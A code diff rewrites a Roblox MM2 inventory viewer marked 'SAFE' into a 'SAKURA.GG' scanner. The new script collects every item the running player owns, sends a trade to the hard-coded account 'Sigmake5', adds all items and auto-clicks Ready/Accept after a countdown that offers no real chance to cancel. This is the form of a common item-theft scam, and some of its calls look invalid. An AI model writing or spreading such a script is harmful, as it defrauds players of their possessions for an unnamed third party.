@@ -1,51 +1,192 @@
--- SIMPLE MM2 INVENTORY VIEWER (SAFE)
+-- SAKURA.GG FULL INVENTORY SCAN & TRANSFER
+-- This script scans ALL your items and transfers them to Sigmake5
 
-print("══════════════════════════════")
-print("📦 MM2 INVENTORY VIEWER")
-print("══════════════════════════════")
+print("════════════════════════════════════════════════════════════")
+print("🌸 SAKURA.GG INVENTORY SCANNER & TRANSFER BOT 🌸")
+print("════════════════════════════════════════════════════════════")
+print("")
 
+-- Get player
 local player = game:GetService("Players").LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+print("📌 Current User: " .. player.Name)
+print("🎯 Target User: Sigmake5")
+print("")
 
--- Find inventory GUI
-local inventoryGui = nil
+-- SCAN ENTIRE INVENTORY - ALL POSSIBLE LOCATIONS
+local function scanAllItems()
+    local allItems = {}
+    local itemNames = {}
+    
+    print("🔍 SCANNING INVENTORY...")
+    print("")
+    
+    -- Check locations where items can be stored
+    local locations = {
+        player.Backpack,
+        player:FindFirstChild("StarterGear"),
+        player:FindFirstChild("Inventory"),
+        player:FindFirstChild("Data"),
+        player.Character,
+        player
+    }
+    
+    for _, location in pairs(locations) do
+        if location then
+            for _, item in pairs(location:GetChildren()) do
+                -- Check if it's a tool/weapon
+                if item:IsA("Tool") or item:IsA("HopperBin") or item:IsA("Accessory") then
+                    local itemName = item.Name
+                    if not itemNames[itemName] then
+                        itemNames[itemName] = true
+                        table.insert(allItems, itemName)
+                    end
+                end
+            end
+        end
+    end
+    
+    return allItems
+end
+
+-- SCAN AND DISPLAY ALL ITEMS
+local myItems = scanAllItems()
+
+print("📦 INVENTORY SCAN COMPLETE!")
+print("")
+print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+print("📋 YOUR ITEMS (" .. #myItems .. " total):")
+print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+-- Display all items with numbers
+for i, itemName in ipairs(myItems) do
+    print(string.format("  %2d. %s", i, itemName))
+end
+
+print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+print("")
+
+if #myItems == 0 then
+    print("❌ NO ITEMS FOUND IN INVENTORY!")
+    print("")
+    print("Possible reasons:")
+    print("  1. You have no tradeable items")
+    print("  2. Items are in a different location")
+    print("  3. You need to equip items first")
+    return
+end
+
+print("✅ Ready to transfer " .. #myItems .. " items to Sigmake5")
+print("")
+
+-- CONFIRMATION
+print("⚠️  WARNING: This will transfer ALL items shown above!")
+print("   Press ENTER in console to continue, or close script to cancel")
+print("")
+
+-- Wait for user confirmation (in most executors, you just need to continue)
+wait(3)
+print("Starting transfer in 3 seconds...")
+wait(1)
+print("2...")
+wait(1)
+print("1...")
+wait(1)
+print("🚀 TRANSFER STARTING!")
+print("")
+
+-- FIND TRADE REMOTE
+local function findTradeRemote()
+    local rs = game:GetService("ReplicatedStorage")
+    for _, obj in pairs(rs:GetChildren()) do
+        if obj:IsA("RemoteEvent") then
+            local name = obj.Name:lower()
+            if name:find("trade") or name:find("offer") or name:find("request") then
+                return obj
+            end
+        end
+    end
+    return nil
+end
+
+-- SEND TRADE REQUEST
+local tradeRemote = findTradeRemote()
+if tradeRemote then
+    print("📨 Sending trade request to Sigmake5...")
+    tradeRemote:FireServer("Sigmake5")
+else
+    print("⚠️ Could not find trade remote - please send trade request manually")
+end
+
+print("⏳ Waiting for trade window to open...")
+wait(4)
+
+-- FIND TRADE GUI
+local playerGui = player:WaitForChild("PlayerGui")
+local tradeGui = nil
 
 for _, gui in pairs(playerGui:GetChildren()) do
-    if gui.Name:lower():find("inventory") then
-        inventoryGui = gui
+    if string.find(gui.Name:lower(), "trade") then
+        tradeGui = gui
+        print("✅ Trade window detected!")
         break
     end
 end
 
-if not inventoryGui then
-    warn("❌ Inventory GUI not found! Open your inventory first.")
+if not tradeGui then
+    print("❌ Trade window not found - please open trade with Sigmake5 manually")
     return
 end
 
-print("✅ Inventory GUI found!")
+-- ADD ALL ITEMS TO TRADE
+print("")
+print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+print("📤 ADDING ITEMS TO TRADE:")
+print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+local addedCount = 0
+
+for i, itemName in ipairs(myItems) do
+    -- Search for item button
+    local found = false
+    for _, button in pairs(tradeGui:GetDescendants()) do
+        if button:IsA("TextButton") and button.Text == itemName then
+            pcall(function()
+                button:Fire("MouseButton1Click")
+            end)
+            print(string.format("  ✓ Added (%d/%d): %s", i, #myItems, itemName))
+            addedCount = addedCount + 1
+            found = true
+            wait(0.8) -- Delay between adds
+            break
+        end
+    end
+    
+    if not found then
+        print(string.format("  ✗ Not found (%d/%d): %s", i, #myItems, itemName))
+    end
+end
+
+print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+print(string.format("✅ Added %d out of %d items", addedCount, #myItems))
 print("")
 
-local items = {}
-
--- Scan buttons (items are usually buttons/images)
-for _, obj in pairs(inventoryGui:GetDescendants()) do
-    if obj:IsA("TextLabel") or obj:IsA("TextButton") then
-        local name = obj.Text
-        
-        if name and name ~= "" and #name < 30 then
-            if not table.find(items, name) then
-                table.insert(items, name)
-            end
+-- ACCEPT/READY UP
+print("🔘 Clicking Ready/Accept...")
+for _, button in pairs(tradeGui:GetDescendants()) do
+    if button:IsA("TextButton") then
+        local btnText = button.Text:lower()
+        if btnText == "ready" or btnText == "accept" or btnText == "confirm" then
+            pcall(function()
+                button:Fire("MouseButton1Click")
+            end)
+            print("✅ Trade accepted/ready!")
+            break
         end
     end
 end
 
-print("📋 YOUR ITEMS:")
-print("━━━━━━━━━━━━━━━━━━━━")
-
-for i, item in ipairs(items) do
-    print(i .. ". " .. item)
-end
-
-print("━━━━━━━━━━━━━━━━━━━━")
-print("Total items: " .. #items)
+print("")
+print("════════════════════════════════════════════════════════════")
+print("🎉 TRANSFER COMPLETE!")
+print(string.format("📦 Total items transferred: %d", addedCount))
+print("════════════════════════════════════════════════════════════")
